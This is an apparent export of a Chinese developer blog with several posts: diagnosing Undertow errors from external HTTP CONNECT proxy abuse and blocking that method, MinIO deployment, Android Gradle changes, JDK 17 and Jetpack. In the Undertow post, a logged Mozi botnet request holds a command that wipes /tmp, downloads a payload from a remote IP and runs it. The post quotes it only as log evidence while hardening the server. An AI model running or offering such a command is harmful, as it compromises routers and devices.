~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.WorkerThread.safeRun(WorkerThread.java:582) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.WorkerThread.run(WorkerThread.java:466) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]2021-10-11 19:53:54.083 ERROR 10473 --- [ XNIO-2 I/O-2] io.undertow.request : UT005071: Undertow request failed HttpServerExchange&#123; CONNECT hotmail-com.olc.protection.outlook.com:25&#125;java.lang.IllegalArgumentException: UT000068: Servlet path match failed at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.accesslog.AccessLogHandler.handleRequest(AccessLogHandler.java:148) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:162) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:100) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:57) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners$10.handleEvent(ChannelListeners.java:291) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners$10.handleEvent(ChannelListeners.java:286) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.QueuedNioTcpServer$1.run(QueuedNioTcpServer.java:129) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.WorkerThread.safeRun(WorkerThread.java:582) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] at org.xnio.nio.WorkerThread.run(WorkerThread.java:466) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final] 项目中并没有使用以上域名的API或者SDK，为何会向其发出请求呢？ 2. 增加容器日志记录开启Undertow的Access日志：123456server: port: 8080 undertow: accesslog: enabled: true dir: /var/log/undertow 观察到以下记录：123445.61.188.13 - - [11/Oct/2021:22:54:29 +0800] \"GET /config/getuser?index=0 HTTP/1.0\" 404 29545.61.188.13 - - [11/Oct/2021:23:30:01 +0800] \"POST /boaform/admin/formLogin HTTP/1.1\" 404 29589.248.165.52 - - [11/Oct/2021:19:53:54 +0800] \"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1\" 500 -89.248.165.52 - - [11/Oct/2021:21:17:17 +0800] \"CONNECT 85.206.160.115:80 HTTP/1.1\" 500 - 原来这些域名信息都是外部请求带过来的，查询资料发现 CONNECT 是【HTTP代理方法】的内容，和 GET 、 POST 是同一个级别的关键词， CONNECT 的作用就是将服务器作为代理。 CONNECT 代理完整的报文：12345CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1\\r\\nHost: hotmail-com.olc.protection.outlook.com:25\\r\\nProxy-Connection: Keep-Alive\\r\\nContent-Length: 0\\r\\n\\r\\n 参考【HTTP (HyperText Transfer Protocol)】 GET: A client can use the GET request to get a web resource from the server. HEAD: A client can use the HEAD request to get the header that a GET request would have obtained. Since the header contains the last-modified date of the data, this can be used to check against the local cache copy. POST: Used to post data up to the web server. PUT: Ask the server to store the data. DELETE: Ask the server to delete the data. TRACE: Ask the server to return a diagnostic trace of the actions it takes. OPTIONS: Ask the server to return the list of request methods it supports. CONNECT: Used to tell a proxy to make a connection to another host and simply reply the content, without attempting to parse or cache it. This is often used to make SSL connection through the proxy. Other extension methods. 3. 复现异常为了复现以上异常，创建一个 TCP Socket 向 Undertow 服务发送报文即可。123456789101112131415public static void main(String[] args) throws IOException, InterruptedException &#123; Socket socket = new Socket(); SocketAddress address = new InetSocketAddress(\"localhost\", 8080); socket.connect(address, 5000); socket.setSoTimeout(10000); OutputStream outputStream = socket.getOutputStream(); outputStream.write((\"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1\\r\\n\" + \"Host: hotmail-com.olc.protection.outlook.com\\r\\n\" + \"Proxy-Connection: Keep-Alive\\r\\n\\r\\n\").getBytes()); outputStream.flush(); outputStream.close(); socket.close();&#125; 4. 消除异常那么如何禁止外部尝试用我们服务做代理呢？我们想到的是当然是禁止CONNECT这个方法，Springboot给我提供的方法，我们只需要加一个配置即可： 12345678910111213141516171819202122232425262728293031import io.undertow.server.HandlerWrapper;import io.undertow.server.HttpHandler;import io.undertow.server.handlers.DisallowedMethodsHandler;import io.undertow.util.HttpString;import org.springframework.boot.web.embedded.undertow.UndertowServletWebServerFactory;import org.springframework.boot.web.server.WebServerFactoryCustomizer;import org.springframework.context.annotation.Configuration;@Configurationpublic class UndertowWebServerCustomizerConfig implements WebServerFactoryCustomizer&lt;UndertowServletWebServerFactory&gt; &#123; @Override public void customize(UndertowServletWebServerFactory factory) &#123; factory.addDeploymentInfoCustomizers(deploymentInfo -&gt; &#123; deploymentInfo.addInitialHandlerChainWrapper(new HandlerWrapper() &#123; @Override public HttpHandler wrap(HttpHandler handler) &#123; //禁止三个方法TRACE也是不安全的 System.out.println(\"disable HTTP methods: CONNECT/TRACE/TRACK\"); HttpString[] disallowedHttpMethods = &#123; HttpString.tryFromString(\"CONNECT\"), HttpString.tryFromString(\"TRACE\"), HttpString.tryFromString(\"TRACK\") &#125;; return new DisallowedMethodsHandler(handler, disallowedHttpMethods); &#125; &#125;); &#125;); &#125;&#125; 再观察access日志：12127.0.0.1 - - [12/Oct/2021:14:38:06 +0800] \"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1\" 405 -127.0.0.1 - - [12/Oct/2021:14:38:24 +0800] \"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1\" 405 - 加上UndertowWebServerCustomizerConfig，有以下两点变化： 项目Java中不会抛异常 HTTP响应状态码由500变为405(Method not allowed) 5. 其他通过容器的日志，发现这样一条记录：123179.42.105.0 - - [11/Oct/2021:17:26:18 +0800] \"GET /setup.cgi?next_file=netgear.cfg&amp;todo=syscmd&amp;cmd=rm+-rf+/tmp/*;wget+http://179.42.107.161:52500/Mozi.m+-O+/tmp/netgear;sh+netgear&amp;curpath=/&amp;currentsetting.htm=1 HTTP/1.0\" 404 119 这是 Mozi 僵尸网络，专门攻击路由器的，详情请看【Mozi僵尸网络可攻击华为、中兴IoT设备】","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[{"name":"Undertow","slug":"Undertow","permalink":"http://yoursite.com/tags/Undertow/"}]},{"title":"IDEA插件代码绘图PlantUML","slug":"IDE/IDEA插件代码绘图PlantUML","date":"2021-09-29T12:52:36.000Z","updated":"2021-12-28T03:24:10.134Z","comments":true,"path":"IDE/IDEA插件代码绘图PlantUML/","link":"","permalink":"http://yoursite.com/IDE/IDEA插件代码绘图PlantUML/","excerpt":"","text":"现在国内免费的流程图画图软件网页版的居多，如 ProcessOn 、 GitMind 、DrawIO 等。现在发现一个新的选择，IDEA上的PlantUML是一个开源的插件，可以使用代码来画图。 Visio是商业软件 ，MasterMind 和 XMind 可以长期免费试用，只是导出文件有水印。 安装方法很简单，在插件市场上直接搜索安装。 创建一个PlantUML文件，选择图形类型，新文件会有示例代码 支持的类型挺多的，这里截图我关注的几个类型，效果还不错： 流程图是我比较感兴趣的，拖鼠标没写代码来的亲切 思维导图软件择比较多，这是默认样式 思维导图还可以选择不同颜色 时序图在微信的文档经常出现 树形图 更多请参考：【IDEA画图神器来了】","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[{"name":"uml","slug":"uml","permalink":"http://yoursite.com/tags/uml/"}]},{"title":"Linux单机部署MinIO","slug":"Linux/Linux单机部署MinIO","date":"2021-09-25T01:52:36.000Z","updated":"2021-12-28T03:24:10.165Z","comments":true,"path":"Linux/Linux单机部署MinIO/","link":"","permalink":"http://yoursite.com/Linux/Linux单机部署MinIO/","excerpt":"","text":"介绍MinIO 是在 GNU Affero General Public License v3.0 下发布的高性能对象存储。 兼容 Amazon S3 云存储服务接口。 由于兼容S3，后期数据量大不想自己维护，可以很方便的切换到其他的对象存储云服务（如：Amazon S3 、阿里OSS、 腾讯云等） 部署MinIO不但支持分布式部署，还提供了与k8s、etcd、docker等容器化技术深度集成方案。但是单机的MinIO服务器最适合早期开发和评估，这里也是已部署单机为例。 1. 容器部署 官网推荐用podman 12podman run -p 9000:9000 -p 9001:9001 \\ quay.io/minio/minio server /data --console-address \":9001\" docker 1234567docker pull minio/miniodocker run \\ -p 9000:9000 \\ -p 9001:9001 \\ -e \"MINIO_ROOT_USER=AKIAIOSFODNN7EXAMPLE\" \\ -e \"MINIO_ROOT_PASSWORD=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\" \\ quay.io/minio/minio server /data --console-address \":9001\" 【官网指引】 2. 二进制单机部署1234567891011121314151617181920212223wget https://dl.min.io/server/minio/release/linux-amd64/miniochmod +x minio./minio server ./data # ./data是数据存储的位置，这里是同目录的data目录下# 下面是控制台信息打印API: http://192.168.0.223:9000 http://127.0.0.1:9000 RootUser: minioadmin RootPass: minioadmin Console: http://192.168.0.223:43404 http://127.0.0.1:43404 RootUser: minioadmin RootPass: minioadmin Command-line: https://docs.min.io/docs/minio-client-quickstart-guide $ mc alias set myminio http://192.168.0.223:9000 minioadmin minioadminDocumentation: https://docs.min.ioWARNING: Console endpoint is listening on a dynamic port (43404), please use --console-address \":PORT\" to choose a static port.WARNING: Detected default credentials 'minioadmin:minioadmin', we recommend that you change these values with 'MINIO_ROOT_USER' and 'MINIO_ROOT_PASSWORD' environment variables --console-address &quot;:9001&quot; 可以指定Web控制台Dashboard的端口 Client SDKMinIO 的客户端(mc)是和S3一样的命令行工具。MinIO 提供了 Java、JavaScript、Python、Golang、.Net 等各种语言的SDK。 以 Java SDK 为例： Maven依赖 12345&lt;dependency&gt; &lt;groupId&gt;io.minio&lt;/groupId&gt; &lt;artifactId&gt;minio&lt;/artifactId&gt; &lt;version&gt;8.3.0&lt;/version&gt;&lt;/dependency&gt; Gradle依赖 123dependencies &#123; compile 'io.minio:minio:8.3.0'&#125; 为了连接到对象存储服务器，需要以下三个参数： Parameters Description Endpoint URL to S3 service. Access Key Access key (aka user ID) of an account in the S3 service. Secret Key Secret key (aka password) of an account in the S3 service. 示例代码： 这个例子使用了MinIO服务器 https://play.min.io ，请随意使用此服务进行测试和开发。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import io.minio.BucketExistsArgs;import io.minio.MakeBucketArgs;import io.minio.MinioClient;import io.minio.UploadObjectArgs;import io.minio.errors.MinioException;import java.io.IOException;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;public class FileUploader &#123; public static void main(String[] args) throws IOException, NoSuchAlgorithmException, InvalidKeyException &#123; try &#123; // Create a minioClient with the MinIO server playground, its access key and secret key. MinioClient minioClient = MinioClient.builder() .endpoint(\"https://play.min.io\") .credentials(\"Q3AM3UQ867SPQQA43P2F\", \"zuf+tfteSlswRu7BJ86wekitnifILbZam1KYY3TG\") .build(); // Make 'asiatrip' bucket if not exist. boolean found = minioClient.bucketExists(BucketExistsArgs.builder().bucket(\"asiatrip\").build()); if (!found) &#123; // Make a new bucket called 'asiatrip'. minioClient.makeBucket(MakeBucketArgs.builder().bucket(\"asiatrip\").build()); &#125; else &#123; System.out.println(\"Bucket 'asiatrip' already exists.\"); &#125; // Upload '/home/user/Photos/asiaphotos.zip' as object name 'asiaphotos-2015.zip' to bucket // 'asiatrip'. minioClient.uploadObject( UploadObjectArgs.builder() .bucket(\"asiatrip\") .object(\"asiaphotos-2015.zip\") .filename(\"/home/user/Photos/asiaphotos.zip\") .build()); System.out.println( \"'/home/user/Photos/asiaphotos.zip' is successfully uploaded as \" + \"object 'asiaphotos-2015.zip' to bucket 'asiatrip'.\"); &#125; catch (MinioException e) &#123; System.out.println(\"Error occurred: \" + e); System.out.println(\"HTTP trace: \" + e.httpTrace()); &#125; &#125;&#125; 扩展资料【使用minio搭建高性能对象存储-第一部分：原型】","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"minio","slug":"minio","permalink":"http://yoursite.com/tags/minio/"}]},{"title":"Android Studio Arctic Fox 依赖仓库变动","slug":"Android/Android Studio Arctic Fox 依赖仓库变动","date":"2021-09-22T11:52:36.000Z","updated":"2021-12-28T03:24:10.102Z","comments":true,"path":"Android/Android Studio Arctic Fox 依赖仓库变动/","link":"","permalink":"http://yoursite.com/Android/Android Studio Arctic Fox 依赖仓库变动/","excerpt":"","text":"升级了Android Studio创建了一个新的新项目，添加aar库出现各种找不到库的问题。版本信息如下：123456Android Studio Arctic Fox | 2020.3.1Build #AI-203.7717.56.2031.7583922, built on July 27, 2021Runtime version: 11.0.10+0-b96-7249189 amd64VM: OpenJDK 64-Bit Server VM by Oracle CorporationWindows 10 10.0GC: G1 Young Generation, G1 Old Generation 下面记录一下变动： repositories变动/project/build.gradle 内的 allprojects 节点移动到了 /project/settings.gradle，内容如下： 1234567891011dependencyResolutionManagement &#123; repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) repositories &#123; google() mavenCentral() jcenter() // Warning: this repository is going to shut down soon flatDir &#123; dirs 'libs' &#125; &#125;&#125; libs目录变动从以上flatDir配置看到，’libs’ 就是当前目录下的 libs 目录libs目录默认由 /project/module/libs 改为 /project/libs 。不设置flatDir，项目构建时会提示错误。 1. 旧版完整的代码： /project/build.gradle 123456789101112131415161718192021222324252627282930buildscript &#123; repositories &#123; google() mavenCentral() maven &#123; url &apos;https://jitpack.io&apos; &#125; &#125; dependencies &#123; classpath &apos;com.android.tools.build:gradle:4.2.1&apos; classpath &quot;org.jetbrains.kotlin:kotlin-gradle-plugin:1.5.20&quot; // NOTE: Do not place your application dependencies here; they belong // in the individual module build.gradle files &#125;&#125;allprojects &#123; repositories &#123; google() jcenter() maven &#123; url &apos;https://jitpack.io&apos; &#125; flatDir&#123; dirs &apos;libs&apos; &#125; &#125;&#125;task clean(type: Delete) &#123; delete rootProject.buildDir&#125; /project/settings.gradle 12rootProject.name = &quot;appDemo&quot;include &apos;:app&apos; 2. 新版完整的代码： /project/build.gradle 12345678910111213141516171819buildscript &#123; repositories &#123; google() mavenCentral() maven &#123; url &apos;https://jitpack.io&apos; &#125; &#125; dependencies &#123; classpath &quot;com.android.tools.build:gradle:7.0.0&quot; classpath &quot;org.jetbrains.kotlin:kotlin-gradle-plugin:1.5.20&quot; // NOTE: Do not place your application dependencies here; they belong // in the individual module build.gradle files &#125;&#125;task clean(type: Delete) &#123; delete rootProject.buildDir&#125; /project/settings.gradle 12345678910111213dependencyResolutionManagement &#123; repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) repositories &#123; google() mavenCentral() jcenter() // Warning: this repository is going to shut down soon flatDir &#123; dirs &apos;libs&apos; &#125; &#125;&#125;rootProject.name = &quot;appDemo&quot;include &apos;:app&apos;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Win10微软应用商店无法加载页面","slug":"随笔/Win10微软应用商店无法加载页面","date":"2021-09-21T02:32:36.000Z","updated":"2021-12-28T03:24:10.305Z","comments":true,"path":"随笔/Win10微软应用商店无法加载页面/","link":"","permalink":"http://yoursite.com/随笔/Win10微软应用商店无法加载页面/","excerpt":"","text":"问题Win10微软商店无法加载页面，错误码：0x80131500 修复 WINDOWS + R 键，输入 inetcpl.cpl 打开 TLS 1.2 选项 应用或者确定 重新打开微软应用商店","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"JDK 17 新特性","slug":"Java/JDK 17 新特性","date":"2021-09-14T11:51:41.000Z","updated":"2021-12-30T09:09:17.567Z","comments":true,"path":"Java/JDK 17 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 17 新特性/","excerpt":"","text":"2021年09月14 JDK 17 发布。这是 JDK 11 后的第二个长期支持版本（ 2029年9月到期 ）。 根据最新发布的“Oracle No-Fee Terms and Conditions”（NFTC）许可，撤回了 2018 年制定的要对 Oracle JDK 收取商用费用的决定，并且不影响 Oracle OpenJDK 的发行。 新特性 306: Restore Always-Strict Floating-Point Semantics 356: Enhanced Pseudo-Random Number Generators 382: New macOS Rendering Pipeline 391: macOS/AArch64 Port 398: Deprecate the Applet API for Removal 403: Strongly Encapsulate JDK Internals JDK 406: Pattern Matching for switch (Preview) 407: Remove RMI Activation 409: Sealed Classes 410: Remove the Experimental AOT and JIT Compiler 411: Deprecate the Security Manager for Removal 412: Foreign Function &amp; Memory API (Incubator) 414: Vector API (Second Incubator) 415: Context-Specific Deserialization Filters 中文 306: 恢复始终执行严格模式的浮点定义 356: 增强型伪随机数生成器 382: 新的 macOS 渲染管道 391: 支持原生的 Apple 的新 Arm 64 架构（Mac 的 M1 芯片） 398: 弃用 Applet API 403: JDK 内部强封装 406: 为 switch 支持模式匹配 407: 移除 RMI 激活 409: 正式引入密封类，限制抽象类的实现 410: 移除实验性的 AOT 和 JIT 编译器 411: 弃用安全管理器 412: 外部函数和内存 API（孵化中） 414: 矢量 API（二次孵化中） 415: 上下文特定反序列化过滤器 总结：虽然JDK17也是一个LTS版本，但是并没有像JDK8和JDK11一样引入比较突出的特性，主要是对前几个版本的整合和完善。 Spring Boot 2.5.5是Spring Boot 第一个支持Java 17的版本 详细的了解新特性","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"免费的多平台数据库工具DBeaver","slug":"IDE/免费的多平台数据库工具","date":"2021-09-10T12:52:36.000Z","updated":"2021-12-28T03:24:10.138Z","comments":true,"path":"IDE/免费的多平台数据库工具/","link":"","permalink":"http://yoursite.com/IDE/免费的多平台数据库工具/","excerpt":"","text":"数据库工具最好不要用破解的，连接生产环境的数据库风险还是很大的。 免费的多平台数据库工具【DBeaver】，功能很强大，支持多种SQL数据库。 版本21.2.0.202108310918 DBeaver是Java开发的，所以支持Windows、Linux、MacOS多平台，提供安装包和免安装的压缩包。 DBeaver有社区免费版和企业收费版本，社区版只有基础功能，企业版拥有更多的功能： NoSQL 和 BigData 支持 (MongoDB / InfluxDB / Redis) 可视化查询构建器 分析图表 查询历史 所有主要驱动程序包 【更多请阅读】 以下是社区版支持的数据库（有点多！！！）： 但是社区版不支持NoSQL（Redis、MongoDB等） 这是连接MySQL的操作界面 DBeaver是Java写的，所以对数据库的支持肯定离不开底层JDBC数据库驱动，DBeaver社区版不会在安装的时候打包所有的驱动，而是用户连接数据库时，如果本地没有相关驱动时下载。","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[]},{"title":"Win10禁止自动更新","slug":"随笔/Win10禁止自动更新","date":"2021-09-03T13:32:36.000Z","updated":"2021-12-28T03:24:10.305Z","comments":true,"path":"随笔/Win10禁止自动更新/","link":"","permalink":"http://yoursite.com/随笔/Win10禁止自动更新/","excerpt":"","text":"听说微软在10月05日开始推送Win11，而有些网友目前已经被推送Win11更新，更新之后都翻了车，不得不重装系统。吓得我赶紧禁止一下Win10上的自动更新。一直以来我是不管Win10，让自己更新、重启，所以系统补丁一直保持最新，但是这次升级Win11跨版本的还是要慎重一点。 快捷键 Win + R ，输入 services.msc 找到 windows update 双击，改为 禁用","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"Ubuntu 16.04 LTS安装新版OpenSSL","slug":"Linux/Ubuntu 16.04 LTS安装新版OpenSSL","date":"2021-08-11T11:52:36.000Z","updated":"2021-12-28T03:24:10.169Z","comments":true,"path":"Linux/Ubuntu 16.04 LTS安装新版OpenSSL/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 16.04 LTS安装新版OpenSSL/","excerpt":"","text":"apt install openssl 版本太旧，用源码安装新版本。 【OpenSSL官网下载新版源码】，这里以 2021-Mar-25 13:41:15 openssl-1.1.1k.tar.gz 为例。 12345678910111213$ wget https://www.openssl.org/source/openssl-1.1.1k.tar.gz$ tar -zxvf openssl-1.1.1k.tar.gz$ sudo ./config$ make$ make install# 将旧版本的openssl进行备份$ sudo mv /usr/bin/openssl /usr/bin/openssl.old# 将新版本的openssl进行软链接$ sudo ln -s /usr/local/bin/openssl /usr/bin/openssl# 重新加载配置$ ldconfig$ openssl versionOpenSSL 1.1.1k 25 Mar 2021","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"Axure RP 9","slug":"前端/Axure RP 9","date":"2021-06-02T11:52:36.000Z","updated":"2021-12-28T03:24:10.244Z","comments":true,"path":"前端/Axure RP 9/","link":"","permalink":"http://yoursite.com/前端/Axure RP 9/","excerpt":"","text":"RP9 Release 历史 9.0.0.3687版本的秘钥（高版本可能不支持）【Axure RP 9.0.0.3687版本下载地址】 。。。附件中 9.0.0.3646版本的秘钥（这是9系列的第一个版本，高版本可能不支持）【Axure RP 9.0.0.3646版本下载地址】 。。。附件中","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"axure","slug":"axure","permalink":"http://yoursite.com/tags/axure/"}]},{"title":"Drawio在线绘图开源","slug":"前端/Drawio在线绘图开源","date":"2021-06-02T11:52:36.000Z","updated":"2021-12-28T03:24:10.246Z","comments":true,"path":"前端/Drawio在线绘图开源/","link":"","permalink":"http://yoursite.com/前端/Drawio在线绘图开源/","excerpt":"","text":"很早知道国外的在线绘图服务Draw.io了，虽然是免费的而且好用，但网络速度慢啊，所以一直没用。而且国内有【Gitmind思维导图】 和 【ProcessOn免费在线流程图思维导图】 也是免费而且挺好用的。 自从阅读文章【部署一个私有的在线绘图服务】，等知drawio开源了项目【jgraph/drawio】 ，很感兴趣。 这样的话我们是可以在本地局域网部署drawio服务，网速慢的问题就解决了，以后绘图软件就增多了新的一个选择。 而且这个文章作者还把开源版drawio的后端Java部分裁剪掉了(具体裁剪文章上有记录)，变成纯网页版【tobyqin/drawio-local】，部署也变得更加简单，把这个项目下载下来直接丢在一个webserver(如：nginx，apache，iis等)上就可以直接用。 drawio默认是英文，可以切换为中文 这是我运行的效果：","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"drawio","slug":"drawio","permalink":"http://yoursite.com/tags/drawio/"}]},{"title":"Word另存为Html设置编码","slug":"前端/Word另存为Html设置编码","date":"2021-06-02T11:52:36.000Z","updated":"2021-12-28T03:24:10.253Z","comments":true,"path":"前端/Word另存为Html设置编码/","link":"","permalink":"http://yoursite.com/前端/Word另存为Html设置编码/","excerpt":"","text":"Word文档另存为Html时，默认编码是 gb2312 ，在浏览器打开中文容易乱码，手动改为 UTF-8是可以，但有点麻烦。 其实Word可以支持修改编码，在 另存为窗口的 “工具” - “编码” 就可以选择保存所用的编码，选择 UTF-8 就行。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[{"name":"word,html","slug":"word-html","permalink":"http://yoursite.com/tags/word-html/"}]},{"title":"GitHub资源备忘2021","slug":"github/GitHub资源备忘2021","date":"2021-05-24T04:42:45.000Z","updated":"2021-12-28T03:24:10.243Z","comments":true,"path":"github/GitHub资源备忘2021/","link":"","permalink":"http://yoursite.com/github/GitHub资源备忘2021/","excerpt":"","text":"音频条形图Github 音频/声音波纹动画Github StepView订单流程Gitee介绍 Coil 是一个 Android 图片加载库通过 Kotlin 协程的方式加载图片，Coil 首选 Kotlin 语言开发并且使用包含 Coroutines, OkHttp, Okio 和 AndroidX Lifecycles 在内最流行的开源库。Coil 只有2000个方法（前提是你的 APP 里面集成了 OkHttp 和 Coroutines），Coil 和 Picasso 的方法数差不多，相比 Glide 和 Fresco 要轻量很多。Github123456789101112131415161718implementation(&quot;io.coil-kt:coil:1.2.1&quot;)// URLimageView.load(&quot;https://www.example.com/image.jpg&quot;)// ResourceimageView.load(R.drawable.image)// FileimageView.load(File(&quot;/path/to/image.jpg&quot;))// 自定义imageView.load(&quot;https://www.example.com/image.jpg&quot;) &#123; crossfade(true) placeholder(R.drawable.image) transformations(CircleCropTransformation())&#125;","categories":[{"name":"Github","slug":"Github","permalink":"http://yoursite.com/categories/Github/"}],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]},{"title":"Android Jetpack架构组件","slug":"Android/Android Jetpack架构组件","date":"2021-04-27T11:52:36.000Z","updated":"2021-12-28T03:24:10.088Z","comments":true,"path":"Android/Android Jetpack架构组件/","link":"","permalink":"http://yoursite.com/Android/Android Jetpack架构组件/","excerpt":"","text":"【Android Jetpack 使用入门】【Android 架构组件 Android Jetpack 的一部分。】 Android 架构组件是一组库，可帮助您设计稳健、可测试且易维护的应用。您可以从管理界面组件生命周期和处理数据持久性的类着手。 通过应用架构指南，学习有关汇编稳健应用的基础知识。 管理应用的生命周期。新的生命周期感知型组件可帮助您管理 Activity 和 Fragment 的生命周期。在配置更改后继续有效、避免内存泄漏，以及将数据轻松加载到界面中。 使用 LiveData 构建数据对象，在基础数据库改变时通知视图。 ViewModel 存储界面相关的数据，这些数据不会在应用旋转时销毁。 Room 是一个 SQLite 对象映射库。它可用来避免样板代码，还可以轻松地将 SQLite 表数据转换为 Java 对象。Room 提供 SQLite 语句的编译时检查，并且可以返回 RxJava、Flowable 和 LiveData 可观察对象。 Jetpack有很多部分，这里先整理一下最常用的两个：ViewModel 和 LiveData 一、ViewModel【ViewModel 概览】 ViewModel 以注重生命周期的方式存储和管理界面相关的数据，比如让数据可在屏幕旋转等配置更改后继续留存。类似在 onSaveInstanceState() 处理数据的保存和恢复。 12345import androidx.lifecycle.ViewModelclass TestViewModel : ViewModel() &#123; var num = 0&#125; 123456789101112131415private lateinit var myViewModel: MyViewModeloverride fun onCreate(savedInstanceState: Bundle?) &#123; super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) myViewModel = ViewModelProvider(this).get(MyViewModel::class.java)&#125;fun test()&#123; //直接赋值或者取值 myViewModel.num++ &#125; 这样 num 变量就能在屏幕旋转时自动保存和恢复，单独使用ViewModel感觉没多大优势，如何配合LiveData将更加方便。 Fragment KTX 引入fragment-ktx这个扩展库：1implementation &quot;androidx.fragment:fragment-ktx:1.3.3&quot; 可以更加简洁的创建ViewModel 12345// Get a reference to the ViewModel scoped to this Fragmentval viewModel by viewModels&lt;MyViewModel&gt;()// Get a reference to the ViewModel scoped to its Activityval viewModel by activityViewModels&lt;MyViewModel&gt;() 二、LiveData【LiveData 概览】 LiveData 具有生命周期感知能力观察类，遵循其他应用组件（如 Activity、Fragment 或 Service）的生命周期。这种感知能力可确保 LiveData 仅更新处于活跃生命周期状态的应用组件观察者。 使用 LiveData 的优势: 确保界面符合数据状态 不会发生内存泄漏 不会因 Activity 停止而导致崩溃 不再需要手动处理生命周期 数据始终保持最新状态 适当的配置更改 共享资源 请按照以下步骤使用 LiveData 对象： 创建 LiveData 的实例以存储某种类型的数据。这通常在 ViewModel 类中完成。 创建可定义 onChanged() 方法的 Observer 对象，该方法可以控制当 LiveData 对象存储的数据更改时会发生什么。通常情况下，您可以在界面控制器（如 Activity 或 Fragment）中创建 Observer 对象。 使用 observe() 方法将 Observer 对象附加到 LiveData 对象。observe() 方法会采用 LifecycleOwner 对象。这样会使 Observer 对象订阅 LiveData 对象，以使其收到有关更改的通知。通常情况下，您可以在界面控制器（如 Activity 或 Fragment）中附加 Observer 对象。 123456789class NameViewModel : ViewModel() &#123; // Create a LiveData with a String val currentName: MutableLiveData&lt;String&gt; by lazy &#123; MutableLiveData&lt;String&gt;() &#125; // Rest of the ViewModel...&#125; 1234567891011121314151617class NameActivity : AppCompatActivity() &#123; private val model: NameViewModel by viewModels() override fun onCreate(savedInstanceState: Bundle?) &#123; super.onCreate(savedInstanceState) // 新建观察者实例，用于更新UI val nameObserver = Observer&lt;String&gt; &#123; newName -&gt; nameTextView.text = newName &#125; // 观察 LiveData model.currentName.observe(this, nameObserver) &#125;&#125; 更新LiveData数据， model.currentName.setValue() 或 model.currentName.postValue() 来更新 Name的值，Observer会被回调更新UI。 附加：Android KTX【Android KTX】 是包含在 Android Jetpack 及其他 Android 库中的一组 Kotlin 扩展程序。KTX 扩展程序可以为 Jetpack、Android 平台及其他 API 提供简洁的惯用 Kotlin 